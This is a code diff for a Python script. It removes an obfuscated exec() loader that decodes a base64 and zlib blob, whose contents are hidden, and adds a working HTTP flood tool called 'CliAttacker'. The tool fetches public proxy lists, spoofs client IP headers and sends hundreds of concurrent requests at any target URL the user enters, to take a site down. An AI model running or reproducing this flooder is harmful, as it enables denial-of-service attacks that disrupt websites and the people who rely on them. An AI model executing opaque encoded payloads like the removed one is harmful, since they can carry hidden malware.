@@ -1,2 +1,127 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import aiohttp
+import asyncio
+import random
+import itertools
+import time
+import re
+import string
+import sys
+import shutil
+from colorama import Fore, init
+from tqdm import tqdm
+
+init(autoreset=True)
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+]
+
+proxy_sources = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
+]
+
+class CliAttacker:
+    def __init__(self, target_url, num_requests):
+        self.target_url = target_url
+        self.num_requests = num_requests
+        self.max_concurrent = 250
+        self.success_count = 0
+        self.fail_count = 0
+        self.start_time = None
+
+    def log(self, message):
+        print(f"{message}{Fore.RESET}")
+
+    async def fetch_ip_addresses(self, url):
+        connector = aiohttp.TCPConnector(ssl=False, limit=0)
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            try:
+                async with session.get(url) as response:
+                    text = await response.text()
+                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
+                    return ip_addresses
+            except:
+                return []
+
+    async def get_all_ips(self):
+        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
+        ip_lists = await asyncio.gather(*tasks)
+        all_ips = [ip for sublist in ip_lists for ip in sublist]
+        if len(all_ips) < 1000:
+            all_ips.extend([f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)])
+        return all_ips
+
+    async def send_request(self, session, ip_address):
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "X-Forwarded-For": ip_address,
+            "X-Real-IP": ip_address,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive",
+            "Referer": self.target_url,
+            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        }
+        try:
+            async with session.get(self.target_url, headers=headers, timeout=3) as response:
+                self.success_count += 1
+                if self.success_count % 50 == 0:
+                    elapsed = time.time() - self.start_time
+                    rate = self.success_count / elapsed if elapsed > 0 else 0
+                    self.log(Fore.RED + f"Requests: {self.success_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
+        except:
+            self.fail_count += 1
+
+    async def attack_worker(self, session, ip_cycle, worker_id):
+        while self.success_count + self.fail_count < self.num_requests:
+            await self.send_request(session, next(ip_cycle))
+
+    async def attack(self):
+        self.start_time = time.time()
+        self.log(Fore.CYAN + "Fetching proxy list...")
+
+        ip_list = await self.get_all_ips()
+        if not ip_list:
+            ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(2000)]
+
+        self.log(Fore.CYAN + f"Loaded {len(ip_list)} IPs | Starting attack...")
+        ip_cycle = itertools.cycle(ip_list)
+
+        connector = aiohttp.TCPConnector(limit=0, ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            workers = [self.attack_worker(session, ip_cycle, i) for i in range(self.max_concurrent)]
+            await asyncio.gather(*workers)
+
+        elapsed = time.time() - self.start_time
+        self.log(Fore.BLUE + f"Attack completed: {self.success_count} success, {self.fail_count} failed in {elapsed:.2f}s")
+
+    def run(self):
+        asyncio.run(self.attack())
+
+def print_banner():
+    columns = shutil.get_terminal_size().columns
+    banner = r"""
+
+    █▀▀ █▀█ █▀█ ▄▄ █▀█ ▀▀█ ▄▄ 
+    █▄▄ █▄█ █▀▀ ░░ █▀▀ ░░█ ░░ 
+
+    Made By: 4N0S"""
+    for line in banner.splitlines():
+        print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")
+
+if __name__ == "__main__":
+    print_banner()
+    target_url = input(Fore.RED + "Enter Target URL: ")
+    num_requests = int(input(Fore.RED + "Enter Number of Requests: "))
+
+    if not target_url.startswith(('http://', 'https://')):
+        target_url = 'http://' + target_url
+
+    attacker = CliAttacker(target_url, num_requests)
+    attacker.run()
